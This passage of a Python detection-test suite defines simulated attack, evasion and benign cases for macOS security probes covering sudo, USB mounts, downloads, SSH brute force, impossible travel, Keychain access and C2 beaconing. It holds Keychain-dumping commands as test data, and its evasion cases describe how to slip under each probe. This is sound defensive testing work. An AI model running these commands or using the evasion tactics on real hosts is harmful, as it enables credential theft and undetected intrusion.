)

MACOS_SUDO_ESCALATION_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_sudo_escalation",
        agent="macos_auth",
        name="macos_sudo_escalation",
        title="macOS Sudo Escalation: Privilege Escalation Detection (T1548.003)",
        description=(
            "An attacker uses sudo to escalate privileges on a macOS host. "
            "Tests both successful and failed sudo attempts, multi-event "
            "detection, and boundary cases."
        ),
        mitre_techniques=["T1548.003"],
        mitre_tactics=["privilege_escalation", "defense_evasion"],
        probe_factory=SudoEscalationProbe,
        cases=[
            _SUDO_POS1_SUCCESS,
            _SUDO_POS2_FAILURE,
            _SUDO_POS3_MULTI,
            _SUDO_EVA1_SSH,
            _SUDO_EVA2_SCREENSAVER,
            _SUDO_EVA3_ATTEMPT,
            _SUDO_BEN1_EMPTY,
            _SUDO_BEN2_LOGIN_ONLY,
        ],
    )
)


# =============================================================================
# 5. macOS Removable Media (Peripheral Observatory)
# =============================================================================

# Baseline volumes
_VOL_BASELINE = [
    _volume(name="Akash_Lab", mount_point="/Volumes/Akash_Lab"),
]

_VOL_USB = _volume(
    name="AMOSKYS_VOL",
    mount_point="/Volumes/AMOSKYS_VOL",
)

_VOL_SUSPICIOUS = _volume(
    name="UNTITLED",
    mount_point="/Volumes/UNTITLED",
)

_RM_POS1_BASELINE = AdversarialCase(
    id="macos_rm_baseline",
    title="Baseline scan — learn existing volumes, 0 events",
    category="positive",
    description="First scan establishes baseline of mounted volumes.",
    why="Baseline-diff first run → silent learning.",
    events=_VOL_BASELINE,
    shared_data_key="volumes",
    expect_count=0,
    stateful=True,
)

_RM_POS1_MOUNT = AdversarialCase(
    id="macos_rm_mount_detected",
    title="New volume AMOSKYS_VOL mounted — HIGH severity",
    category="positive",
    description=(
        "A new volume 'AMOSKYS_VOL' appears in /Volumes/. This could be "
        "a USB drive for data exfiltration or BadUSB attack."
    ),
    why="Volume not in baseline → removable_media_mounted fires.",
    events=_VOL_BASELINE + [_VOL_USB],
    shared_data_key="volumes",
    expect_count=1,
    expect_event_types=["removable_media_mounted"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_RM_POS2_BASELINE_FOR_UNMOUNT = AdversarialCase(
    id="macos_rm_baseline_with_usb",
    title="Baseline with USB present",
    category="positive",
    description="Baseline includes the USB volume.",
    why="Learn the volume so unmount detection works.",
    events=_VOL_BASELINE + [_VOL_USB],
    shared_data_key="volumes",
    expect_count=0,
    stateful=True,
)

_RM_POS2_UNMOUNT = AdversarialCase(
    id="macos_rm_unmount_detected",
    title="Volume AMOSKYS_VOL unmounted — INFO severity",
    category="positive",
    description=(
        "The USB volume disappears from /Volumes/. Could indicate "
        "attacker pulled the drive after copying data."
    ),
    why="Volume was in baseline but missing now → removable_media_unmounted.",
    events=_VOL_BASELINE,  # USB gone
    shared_data_key="volumes",
    expect_count=1,
    expect_event_types=["removable_media_unmounted"],
    expect_severity=Severity.INFO,
    stateful=True,
)

_RM_POS3_BASELINE2 = AdversarialCase(
    id="macos_rm_baseline2",
    title="Baseline scan (for second mount test)",
    category="positive",
    description="Fresh baseline.",
    why="Need baseline for second mount detection.",
    events=_VOL_BASELINE,
    shared_data_key="volumes",
    expect_count=0,
    stateful=True,
)

_RM_POS3_MULTI = AdversarialCase(
    id="macos_rm_two_volumes",
    title="Two new volumes — 2 events",
    category="positive",
    description="Two USB drives plugged in simultaneously.",
    why="Both volumes are new → 2 removable_media_mounted events.",
    events=_VOL_BASELINE + [_VOL_USB, _VOL_SUSPICIOUS],
    shared_data_key="volumes",
    expect_count=2,
    expect_event_types=["removable_media_mounted", "removable_media_mounted"],
    stateful=True,
)

_RM_EVA1_SAME_VOLUME = AdversarialCase(
    id="macos_rm_same_volume_no_change",
    title="Same volume unchanged — no alert after baseline",
    category="evasion",
    description="Volume already in baseline, no change detected.",
    why="Volume key matches baseline → not new, not removed.",
    events=_VOL_BASELINE,
    shared_data_key="volumes",
    expect_evades=True,
    stateful=True,  # Continues from POS3_MULTI above — but we need fresh
)

_RM_EVA2_NETWORK = AdversarialCase(
    id="macos_rm_network_share_evades",
    title="Network share mount — not detected as removable media",
    category="evasion",
    description=(
        "Attacker mounts an NFS share. RemovableMediaProbe watches /Volumes/ "
        "which may include network mounts that appear like local volumes."
    ),
    why=(
        "If the network share appears in the volumes list, it will actually fire. "
        "This tests the case where it doesn't appear in /Volumes/."
    ),
    events=[],  # Network shares not in volumes list
    shared_data_key="volumes",
    expect_evades=True,
)

_RM_BEN1_STABLE = AdversarialCase(
    id="macos_rm_stable_state",
    title="No volume changes — 0 events",
    category="benign",
    description="Volumes unchanged from baseline.",
    why="No additions or removals → no events.",
    events=_VOL_BASELINE,
    shared_data_key="volumes",
    expect_count=0,
    stateful=True,
)

_RM_BEN2_EMPTY = AdversarialCase(
    id="macos_rm_empty_volumes",
    title="Empty volume list — 0 events",
    category="benign",
    description="Collector returns no volumes (edge case).",
    why="No volumes to compare against.",
    events=[],
    shared_data_key="volumes",
    expect_count=0,
)

MACOS_REMOVABLE_MEDIA_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_removable_media",
        agent="macos_peripheral",
        name="macos_removable_media",
        title="macOS Removable Media: USB/DMG Mount Detection (T1091)",
        description=(
            "An attacker mounts a USB drive or DMG for data exfiltration or "
            "malware delivery. Tests baseline-diff volume detection including "
            "mount, unmount, and multi-volume scenarios."
        ),
        mitre_techniques=["T1091"],
        mitre_tactics=["initial_access", "lateral_movement"],
        probe_factory=RemovableMediaProbe,
        cases=[
            # Stateful chain 1: baseline → mount
            _RM_POS1_BASELINE,
            _RM_POS1_MOUNT,
            # Chain breaker (evasion: network share)
            _RM_EVA2_NETWORK,
            # Stateful chain 2: baseline → unmount
            _RM_POS2_BASELINE_FOR_UNMOUNT,
            _RM_POS2_UNMOUNT,
            # Chain breaker (benign: empty)
            _RM_BEN2_EMPTY,
            # Stateful chain 3: baseline → two volumes
            _RM_POS3_BASELINE2,
            _RM_POS3_MULTI,
        ],
    )
)


# =============================================================================
# 6. macOS Downloads Monitor (Filesystem Observatory)
# =============================================================================

_DL_DIR = str(Path.home()) + "/Downloads"

_DL_BASELINE_FILES = [
    _file(path=f"{_DL_DIR}/readme.txt", name="readme.txt", sha256="aaa" * 21 + "a"),
    _file(path=f"{_DL_DIR}/photo.jpg", name="photo.jpg", sha256="bbb" * 21 + "b"),
]

_DL_NEW_DMG = _file(
    path=f"{_DL_DIR}/installer.dmg",
    name="installer.dmg",
    sha256="evil" * 16,
    size=52428800,  # 50 MB
)

_DL_NEW_TXT = _file(
    path=f"{_DL_DIR}/notes.txt",
    name="notes.txt",
    sha256="safe" * 16,
    size=256,
)

_DL_NEW_PKG = _file(
    path=f"{_DL_DIR}/update.pkg",
    name="update.pkg",
    sha256="pkg1" * 16,
    size=10485760,  # 10 MB
)

_DL_POS1_BASELINE = AdversarialCase(
    id="macos_dl_baseline",
    title="Baseline scan — learn existing downloads, 0 events",
    category="positive",
    description="First scan establishes baseline of ~/Downloads contents.",
    why="First run → silent baseline learning.",
    events=_DL_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_DL_POS1_DMG = AdversarialCase(
    id="macos_dl_new_dmg",
    title="New .dmg in Downloads — HIGH severity (high-risk extension)",
    category="positive",
    description=(
        "A new installer.dmg appears in ~/Downloads. DMG files are high-risk "
        "on macOS — primary vector for malware distribution."
    ),
    why=(
        "Path starts with ~/Downloads, not in baseline, extension '.dmg' "
        "is in _HIGH_RISK_EXTENSIONS → HIGH severity."
    ),
    events=_DL_BASELINE_FILES + [_DL_NEW_DMG],
    shared_data_key="files",
    expect_count=1,
    expect_event_types=["macos_download_new"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_DL_POS2_BASELINE = AdversarialCase(
    id="macos_dl_baseline2",
    title="Baseline scan for .txt test",
    category="positive",
    description="Fresh baseline.",
    why="Need fresh probe for .txt detection.",
    events=_DL_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_DL_POS2_TXT = AdversarialCase(
    id="macos_dl_new_txt",
    title="New .txt in Downloads — LOW severity (not high-risk)",
    category="positive",
    description="A harmless notes.txt appears in ~/Downloads.",
    why=".txt not in _HIGH_RISK_EXTENSIONS → LOW severity.",
    events=_DL_BASELINE_FILES + [_DL_NEW_TXT],
    shared_data_key="files",
    expect_count=1,
    expect_event_types=["macos_download_new"],
    expect_severity=Severity.LOW,
    stateful=True,
)

_DL_POS3_BASELINE = AdversarialCase(
    id="macos_dl_baseline3",
    title="Baseline scan for multi-file test",
    category="positive",
    description="Fresh baseline.",
    why="Need fresh probe for multi-file detection.",
    events=_DL_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_DL_POS3_MULTI = AdversarialCase(
    id="macos_dl_multi_files",
    title="Two new files — .dmg and .pkg — 2 events",
    category="positive",
    description="Multiple files downloaded simultaneously.",
    why="Both files are new → 2 macos_download_new events.",
    events=_DL_BASELINE_FILES + [_DL_NEW_DMG, _DL_NEW_PKG],
    shared_data_key="files",
    expect_count=2,
    expect_event_types=["macos_download_new", "macos_download_new"],
    stateful=True,
)

_DL_EVA1_NON_DOWNLOAD = AdversarialCase(
    id="macos_dl_non_download_dir",
    title="File in /tmp/ — not in ~/Downloads, not caught",
    category="evasion",
    description="Attacker drops a file in /tmp/ instead of ~/Downloads.",
    why="Path doesn't start with ~/Downloads → not in scope.",
    events=[
        _file(path="/tmp/payload.dmg", name="payload.dmg"),
    ],
    shared_data_key="files",
    expect_evades=True,
)

_DL_EVA2_DESKTOP = AdversarialCase(
    id="macos_dl_desktop_not_monitored",
    title="File on Desktop — DownloadsMonitor doesn't cover ~/Desktop",
    category="evasion",
    description="Attacker saves directly to Desktop via social engineering.",
    why="DownloadsMonitorProbe only watches ~/Downloads.",
    events=[
        _file(path="/Users/testuser/Desktop/evil.dmg", name="evil.dmg"),
    ],
    shared_data_key="files",
    expect_evades=True,
)

_DL_EVA3_SUBDIRECTORY = AdversarialCase(
    id="macos_dl_subdirectory",
    title="File in ~/Downloads subdirectory — depends on collector depth",
    category="evasion",
    description="File in ~/Downloads/subdir/. The probe checks path prefix.",
    why=(
        "If the collector scans subdirectories, the path starts with "
        "~/Downloads/ and would be caught. But if the file isn't in "
        "the collector's output, it's missed."
    ),
    events=[],  # Collector didn't scan this subdirectory
    shared_data_key="files",
    expect_evades=True,
)

_DL_BEN1_UNCHANGED = AdversarialCase(
    id="macos_dl_no_new_files",
    title="No new downloads — 0 events",
    category="benign",
    description="Stable downloads folder with no new files.",
    why="All files in baseline → no additions → 0 events.",
    events=_DL_BASELINE_FILES,
    shared_data_key="files",
    expect_count=0,
    stateful=True,
)

_DL_BEN2_EMPTY = AdversarialCase(
    id="macos_dl_empty_files",
    title="Empty files list — 0 events",
    category="benign",
    description="Collector returns empty file list.",
    why="No files to evaluate.",
    events=[],
    shared_data_key="files",
    expect_count=0,
)

MACOS_DOWNLOADS_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_downloads_monitor",
        agent="macos_filesystem",
        name="macos_downloads_monitor",
        title="macOS Downloads Monitor: Initial Access File Detection (T1204)",
        description=(
            "An attacker delivers malware via phishing email, drive-by download, "
            "or social engineering to ~/Downloads. Tests detection of high-risk "
            "files (.dmg, .pkg) and benign files (.txt) with appropriate severity."
        ),
        mitre_techniques=["T1204"],
        mitre_tactics=["execution"],
        probe_factory=DownloadsMonitorProbe,
        cases=[
            # Stateful chain 1: baseline → DMG
            _DL_POS1_BASELINE,
            _DL_POS1_DMG,
            # Chain breaker (evasion: wrong directory)
            _DL_EVA1_NON_DOWNLOAD,
            # Stateful chain 2: baseline → TXT
            _DL_POS2_BASELINE,
            _DL_POS2_TXT,
            # Chain breaker (benign: empty)
            _DL_BEN2_EMPTY,
            # Stateful chain 3: baseline → multi
            _DL_POS3_BASELINE,
            _DL_POS3_MULTI,
        ],
    )
)


# =============================================================================
# 7. macOS SSH Brute Force (Auth Observatory)
# =============================================================================

_TS_SSH = [
    datetime(2024, 11, 15, i, 0, s, tzinfo=timezone.utc)
    for i, s in [(3, 1), (3, 2), (3, 3), (3, 4), (3, 5), (3, 6), (3, 7), (3, 8)]
]


def _ssh_fail(ip: str, user: str, idx: int) -> AuthEvent:
    return AuthEvent(
        timestamp=_TS_SSH[min(idx, len(_TS_SSH) - 1)],
        process="sshd",
        message=f"Failed password for {user} from {ip} port 54321",
        category="ssh",
        source_ip=ip,
        username=user,
        event_type="failure",
    )


_BF_POS1 = AdversarialCase(
    id="macos_bf_5_failures_one_ip",
    title="5 SSH failures from one IP — brute force HIGH",
    category="positive",
    description=(
        "Attacker runs hydra/medusa against SSH. 5 failed password attempts "
        "from 10.0.0.50 targeting user 'admin'."
    ),
    why="5 failures >= FAILURE_THRESHOLD (5) from one IP → ssh_brute_force.",
    events=[_ssh_fail("10.0.0.50", "admin", i) for i in range(5)],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["ssh_brute_force"],
    expect_severity=Severity.HIGH,
)

_BF_POS2 = AdversarialCase(
    id="macos_bf_8_failures_multi_user",
    title="8 SSH failures targeting multiple users — brute force",
    category="positive",
    description="Attacker tries multiple usernames from the same IP.",
    why="8 failures from same IP exceed threshold. targeted_usernames includes both.",
    events=(
        [_ssh_fail("192.168.1.100", "root", i) for i in range(4)]
        + [_ssh_fail("192.168.1.100", "admin", i) for i in range(4)]
    ),
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["ssh_brute_force"],
    expect_severity=Severity.HIGH,
)

_BF_POS3 = AdversarialCase(
    id="macos_bf_two_ips_both_brute",
    title="Two IPs each with 5+ failures — 2 events",
    category="positive",
    description="Two different attackers brute-forcing simultaneously.",
    why="Each IP independently exceeds threshold → 2 separate events.",
    events=(
        [_ssh_fail("10.0.0.1", "admin", i) for i in range(5)]
        + [_ssh_fail("10.0.0.2", "root", i) for i in range(6)]
    ),
    shared_data_key="auth_events",
    expect_count=2,
    expect_event_types=["ssh_brute_force", "ssh_brute_force"],
)

_BF_EVA1 = AdversarialCase(
    id="macos_bf_below_threshold",
    title="4 failures — below threshold, no alert",
    category="evasion",
    description="Attacker stays just under the threshold to avoid detection.",
    why="4 < FAILURE_THRESHOLD (5) → no event.",
    events=[_ssh_fail("10.0.0.99", "admin", i) for i in range(4)],
    shared_data_key="auth_events",
    expect_evades=True,
)

_BF_EVA2 = AdversarialCase(
    id="macos_bf_spread_across_ips",
    title="5 failures from 5 different IPs — 1 per IP, no brute force",
    category="evasion",
    description="Distributed attack: 1 failure from each of 5 IPs.",
    why="Each IP has only 1 failure < threshold. Distributed brute force evades.",
    events=[_ssh_fail(f"10.0.0.{i}", "admin", i) for i in range(5)],
    shared_data_key="auth_events",
    expect_evades=True,
)

_BF_EVA3 = AdversarialCase(
    id="macos_bf_success_not_failure",
    title="SSH success events — not failures, not counted",
    category="evasion",
    description="Attacker uses valid creds. Successful SSH logins don't count.",
    why="event_type != 'failure' → skipped by brute force counter.",
    events=[
        AuthEvent(
            timestamp=_TS_SSH[0],
            process="sshd",
            message="Accepted publickey for admin from 10.0.0.1",
            category="ssh",
            source_ip="10.0.0.1",
            username="admin",
            event_type="success",
        ),
    ]
    * 6,
    shared_data_key="auth_events",
    expect_evades=True,
)

_BF_BEN1 = AdversarialCase(
    id="macos_bf_no_ssh_events",
    title="No SSH events — 0 events",
    category="benign",
    description="No SSH activity in the collection window.",
    why="Empty auth_events → no iteration.",
    events=[],
    shared_data_key="auth_events",
    expect_count=0,
)

_BF_BEN2 = AdversarialCase(
    id="macos_bf_sudo_not_ssh",
    title="Sudo events only — wrong category for SSH probe",
    category="benign",
    description="Only sudo events present. SSH brute force probe ignores them.",
    why="ev.category != 'ssh' → skipped.",
    events=[
        _auth(message="testuser : COMMAND=/bin/ls /", event_type="failure"),
        _auth(message="testuser : COMMAND=/bin/ls /", event_type="failure"),
        _auth(message="testuser : COMMAND=/bin/ls /", event_type="failure"),
        _auth(message="testuser : COMMAND=/bin/ls /", event_type="failure"),
        _auth(message="testuser : COMMAND=/bin/ls /", event_type="failure"),
    ],
    shared_data_key="auth_events",
    expect_count=0,
)

MACOS_SSH_BRUTE_FORCE_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_ssh_brute_force",
        agent="macos_auth",
        name="macos_ssh_brute_force",
        title="macOS SSH Brute Force: Repeated Login Failure Detection (T1110)",
        description=(
            "An attacker runs a brute-force tool against SSH on a macOS host. "
            "Tests threshold-based detection, multi-user targeting, distributed "
            "attack evasion, and boundary conditions."
        ),
        mitre_techniques=["T1110"],
        mitre_tactics=["credential_access"],
        probe_factory=SSHBruteForceProbe,
        cases=[
            _BF_POS1,
            _BF_POS2,
            _BF_POS3,
            _BF_EVA1,
            _BF_EVA2,
            _BF_EVA3,
            _BF_BEN1,
            _BF_BEN2,
        ],
    )
)


# =============================================================================
# 8. macOS Impossible Travel (Auth Observatory)
# =============================================================================

_IT_T1 = datetime(2024, 11, 15, 10, 0, 0, tzinfo=timezone.utc)
_IT_T2 = datetime(2024, 11, 15, 10, 2, 0, tzinfo=timezone.utc)  # +2 min
_IT_T3 = datetime(2024, 11, 15, 10, 30, 0, tzinfo=timezone.utc)  # +30 min
_IT_T4 = datetime(2024, 11, 15, 16, 0, 0, tzinfo=timezone.utc)  # +6 hours


def _ssh_login(ip: str, user: str, ts: datetime) -> AuthEvent:
    return AuthEvent(
        timestamp=ts,
        process="sshd",
        message=f"Accepted publickey for {user} from {ip} port 22",
        category="ssh",
        source_ip=ip,
        username=user,
        event_type="success",
    )


_IT_POS1 = AdversarialCase(
    id="macos_it_two_ips_2min",
    title="SSH from 2 IPs in 2 minutes — impossible travel HIGH",
    category="positive",
    description=(
        "User 'admin' authenticates from 10.0.0.1, then 2 minutes later "
        "from 203.0.113.5. Physically impossible."
    ),
    why="Same user, different IPs, delta < 300s → impossible_travel.",
    events=[
        _ssh_login("10.0.0.1", "admin", _IT_T1),
        _ssh_login("203.0.113.5", "admin", _IT_T2),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["impossible_travel"],
    expect_severity=Severity.HIGH,
)

_IT_POS2 = AdversarialCase(
    id="macos_it_three_ips_rapid",
    title="SSH from 3 IPs in 4 minutes — 2 impossible travel events",
    category="positive",
    description="User hops across 3 IPs rapidly. Each hop generates an event.",
    why="3 consecutive IP changes within window → 2 events.",
    events=[
        _ssh_login("10.0.0.1", "admin", _IT_T1),
        _ssh_login(
            "10.0.0.2", "admin", datetime(2024, 11, 15, 10, 1, 0, tzinfo=timezone.utc)
        ),
        _ssh_login("10.0.0.3", "admin", _IT_T2),
    ],
    shared_data_key="auth_events",
    expect_count=2,
    expect_event_types=["impossible_travel", "impossible_travel"],
)

_IT_POS3 = AdversarialCase(
    id="macos_it_attempt_event",
    title="SSH attempts (not just success) from 2 IPs — fires",
    category="positive",
    description="SSH 'attempt' events also trigger impossible travel.",
    why="event_type 'attempt' is checked alongside 'success'.",
    events=[
        AuthEvent(
            timestamp=_IT_T1,
            process="sshd",
            message="Connection from 10.0.0.1",
            category="ssh",
            source_ip="10.0.0.1",
            username="admin",
            event_type="attempt",
        ),
        AuthEvent(
            timestamp=_IT_T2,
            process="sshd",
            message="Connection from 203.0.113.5",
            category="ssh",
            source_ip="203.0.113.5",
            username="admin",
            event_type="attempt",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["impossible_travel"],
    expect_severity=Severity.HIGH,
)

_IT_EVA1 = AdversarialCase(
    id="macos_it_same_ip",
    title="SSH from same IP twice — no travel",
    category="evasion",
    description="Same IP both times — no location change.",
    why="prev_ip == curr_ip → continue (skip).",
    events=[
        _ssh_login("10.0.0.1", "admin", _IT_T1),
        _ssh_login("10.0.0.1", "admin", _IT_T2),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_IT_EVA2 = AdversarialCase(
    id="macos_it_outside_window",
    title="SSH from 2 IPs 6 hours apart — outside time window",
    category="evasion",
    description="6 hours between logins. Within reasonable travel time.",
    why="delta_seconds > TIME_WINDOW_SECONDS (300) → skipped.",
    events=[
        _ssh_login("10.0.0.1", "admin", _IT_T1),
        _ssh_login("203.0.113.5", "admin", _IT_T4),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_IT_EVA3 = AdversarialCase(
    id="macos_it_different_users",
    title="Two users from different IPs — not same account",
    category="evasion",
    description="admin from 10.0.0.1, root from 203.0.113.5.",
    why="Different usernames → tracked independently, no comparison.",
    events=[
        _ssh_login("10.0.0.1", "admin", _IT_T1),
        _ssh_login("203.0.113.5", "root", _IT_T2),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_IT_BEN1 = AdversarialCase(
    id="macos_it_no_ssh",
    title="No SSH events — 0 events",
    category="benign",
    description="No SSH activity.",
    why="Empty auth_events → no iteration.",
    events=[],
    shared_data_key="auth_events",
    expect_count=0,
)

_IT_BEN2 = AdversarialCase(
    id="macos_it_no_source_ip",
    title="SSH without source IP — skipped",
    category="benign",
    description="SSH event with no source_ip field.",
    why="source_ip is None → filtered out (requires both IP and username).",
    events=[
        AuthEvent(
            timestamp=_IT_T1,
            process="sshd",
            message="Accepted publickey for admin",
            category="ssh",
            source_ip=None,
            username="admin",
            event_type="success",
        ),
        AuthEvent(
            timestamp=_IT_T2,
            process="sshd",
            message="Accepted publickey for admin",
            category="ssh",
            source_ip=None,
            username="admin",
            event_type="success",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=0,
)

MACOS_IMPOSSIBLE_TRAVEL_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_impossible_travel",
        agent="macos_auth",
        name="macos_impossible_travel",
        title="macOS Impossible Travel: Multi-IP SSH Detection (T1078)",
        description=(
            "An attacker's credentials are used from two different source IPs "
            "within a short time window — physically impossible legitimate travel. "
            "Tests time window, same-IP dedup, and multi-user isolation."
        ),
        mitre_techniques=["T1078"],
        mitre_tactics=["initial_access"],
        probe_factory=ImpossibleTravelProbe,
        cases=[
            _IT_POS1,
            _IT_POS2,
            _IT_POS3,
            _IT_EVA1,
            _IT_EVA2,
            _IT_EVA3,
            _IT_BEN1,
            _IT_BEN2,
        ],
    )
)


# =============================================================================
# 9. macOS Credential Access (Auth Observatory)
# =============================================================================

_CA_POS1 = AdversarialCase(
    id="macos_ca_dump_keychain",
    title="security dump-keychain — CRITICAL credential access",
    category="positive",
    description=(
        "Attacker runs `security dump-keychain` to extract all stored "
        "credentials from the macOS Keychain."
    ),
    why=(
        "category=='keychain', subcommand 'dump-keychain' is in the "
        "CRITICAL escalation set."
    ),
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="security",
            message="security dump-keychain -d login.keychain",
            category="keychain",
            username="attacker",
            event_type="attempt",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["credential_access"],
    expect_severity=Severity.CRITICAL,
)

_CA_POS2 = AdversarialCase(
    id="macos_ca_find_generic_password",
    title="security find-generic-password — CRITICAL",
    category="positive",
    description="Attacker extracts a specific password from Keychain.",
    why="'find-generic-password' in CRITICAL subcommands.",
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="security",
            message="security find-generic-password -a admin -w",
            category="keychain",
            username="attacker",
            event_type="attempt",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["credential_access"],
    expect_severity=Severity.CRITICAL,
)

_CA_POS3 = AdversarialCase(
    id="macos_ca_generic_keychain_event",
    title="security CLI generic Keychain event — HIGH",
    category="positive",
    description="Generic security CLI event without a known-dangerous subcommand.",
    why="category=='keychain' but subcommand not in CRITICAL set → HIGH.",
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="security",
            message="security list-keychains",
            category="keychain",
            username="user",
            event_type="attempt",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=1,
    expect_event_types=["credential_access"],
    expect_severity=Severity.HIGH,
)

_CA_EVA1 = AdversarialCase(
    id="macos_ca_ssh_not_keychain",
    title="SSH event — wrong category, not caught",
    category="evasion",
    description="SSH login event. CredentialAccessProbe targets 'keychain' category.",
    why="ev.category != 'keychain' and message doesn't mention security+keychain.",
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="sshd",
            message="Accepted publickey for admin from 10.0.0.1",
            category="ssh",
            username="admin",
            event_type="success",
        ),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_CA_EVA2 = AdversarialCase(
    id="macos_ca_sudo_not_keychain",
    title="sudo event — wrong category",
    category="evasion",
    description="sudo escalation. Not a Keychain access event.",
    why="ev.category is 'sudo', not 'keychain'.",
    events=[
        _auth(message="admin : COMMAND=/bin/ls", event_type="success"),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_CA_EVA3 = AdversarialCase(
    id="macos_ca_partial_keyword",
    title="Message mentions 'security' but not 'keychain' — no indirect",
    category="evasion",
    description="Log message has 'security' but not 'keychain' together.",
    why="Indirect detection requires both 'security' AND 'keychain' in message.",
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="loginwindow",
            message="security authorization succeeded",
            category="login",
            username="admin",
            event_type="success",
        ),
    ],
    shared_data_key="auth_events",
    expect_evades=True,
)

_CA_BEN1 = AdversarialCase(
    id="macos_ca_no_events",
    title="No auth events — 0 events",
    category="benign",
    description="No auth activity.",
    why="Empty list → no iteration.",
    events=[],
    shared_data_key="auth_events",
    expect_count=0,
)

_CA_BEN2 = AdversarialCase(
    id="macos_ca_screensaver_only",
    title="Screensaver events only — no Keychain",
    category="benign",
    description="Normal screensaver lock/unlock activity.",
    why="category is 'screensaver', not 'keychain'.",
    events=[
        AuthEvent(
            timestamp=_NOW,
            process="screensaverengine",
            message="user authenticated",
            category="screensaver",
            username="user",
            event_type="unlock",
        ),
    ],
    shared_data_key="auth_events",
    expect_count=0,
)

MACOS_CREDENTIAL_ACCESS_SCENARIO: Scenario = register(
    Scenario(
        probe_id="macos_credential_access",
        agent="macos_auth",
        name="macos_credential_access",
        title="macOS Credential Access: Keychain Dump Detection (T1555.001)",
        description=(
            "An attacker uses the macOS `security` CLI to extract credentials "
            "from the Keychain. Tests dump-keychain, find-generic-password, "
            "and indirect detection via keyword matching."
        ),
        mitre_techniques=["T1555.001"],
        mitre_tactics=["credential_access"],
        probe_factory=CredentialAccessProbe,
        cases=[
            _CA_POS1,
            _CA_POS2,
            _CA_POS3,
            _CA_EVA1,
            _CA_EVA2,
            _CA_EVA3,
            _CA_BEN1,
            _CA_BEN2,
        ],
    )
)


# =============================================================================
# 10. macOS C2 Beacon (Network Observatory)
# =============================================================================

_C2_POS1_BASELINE = AdversarialCase(
    id="macos_c2_scan1",
    title="C2 beacon scan 1 — unknown process to external IP",
    category="positive",
    description="First scan: unknown process 'implant' connects to 198.51.100.1.",
    why="Hit 1 of MIN_HITS (3). Accumulates in history.",
    events=[
        _conn(
            pid=666,
            process_name="implant",
            state="ESTABLISHED",
            remote_ip="198.51.100.1",
            remote_port=443,
            local_port=54321,
            remote_addr="198.51.100.1:443",
        ),
    ],
    shared_data_key="connections",
    expect_count=0,  # Only 1 hit, need 3
    stateful=True,
)

_C2_POS1_SCAN2 = AdversarialCase(
    id="macos_c2_scan2",
    title="C2 beacon scan 2 — same process, same IP",
    category="positive",
    description="Second connection from 'implant' to same C2 server.",
    why="Hit 2 of MIN_HITS (3). Still accumulating.",
    events=[
        _conn(
            pid=666,
            process_name="implant",
            state="ESTABLISHED",
            remote_ip="198.51.100.1",
            remote_port=443,
            local_port=54322,
            remote_addr="198.51.100.1:443",
        ),
    ],
    shared_data_key="connections",
    expect_count=0,  # Only 2 hits
    stateful=True,
)

_C2_POS1_FIRE = AdversarialCase(
    id="macos_c2_scan3_fires",
    title="C2 beacon scan 3 — threshold reached, HIGH severity",
    category="positive",
    description="Third connection from 'implant'. MIN_HITS (3) reached.",
    why="3 hits to same remote IP → c2_beacon_suspect fires.",
    events=[
        _conn(
            pid=666,
            process_name="implant",
            state="ESTABLISHED",
            remote_ip="198.51.100.1",
            remote_port=443,
            local_port=54323,
            remote_addr="198.51.100.1:443",
        ),
    ],
    shared_data_key="connections",
    expect_count=1,
    expect_event_types=["c2_beacon_suspect"],
    expect_severity=Severity.HIGH,
    stateful=True,
)

_C2_EVA1 = AdversarialCase(
    id="macos_c2_whitelisted_process",
    title="Slack connecting to external IP — whitelisted",
    category="evasion",
    description="Slack maintains persistent connections. Whitelisted.",
    why="'slack' is in _BEACON_WHITELIST → skipped via prefix match.",
    events=[
        _conn(
            pid=200,
            process_name="Slack",
            state="ESTABLISHED",
            remote_ip="35.190.0.1",
            remote_port=443,
            local_port=55000,
            remote_addr="35.190.0.1:443",
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_C2_EVA2 = AdversarialCase(
    id="macos_c2_private_ip",
    title="Connection to private IP — not external",
    category="evasion",
    description="Connection to 192.168.1.1 (private). Only external IPs tracked.",
    why="_is_private(remote_ip) → skipped.",
    events=[
        _conn(
            pid=666,
            process_name="implant",
            state="ESTABLISHED",
            remote_ip="192.168.1.1",
            remote_port=443,
            local_port=55001,
            remote_addr="192.168.1.1:443",
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_C2_EVA3 = AdversarialCase(
    id="macos_c2_listen_not_established",
    title="LISTEN state — not ESTABLISHED",
    category="evasion",
    description="C2 implant listening but probe only checks ESTABLISHED.",
    why="state != 'ESTABLISHED' → skipped.",
    events=[
        _conn(
            pid=666,
            process_name="implant",
            state="LISTEN",
            remote_ip="",
            remote_port=0,
            local_port=4444,
            local_addr="0.0.0.0:4444",
        ),
    ],
    shared_data_key="connections",
    expect_evades=True,
)

_C2_BEN1 = AdversarialCase(
    id="macos_c2_no_connections",
    title="No connections — 0 events",
    category="benign",
    description="No network connections.",
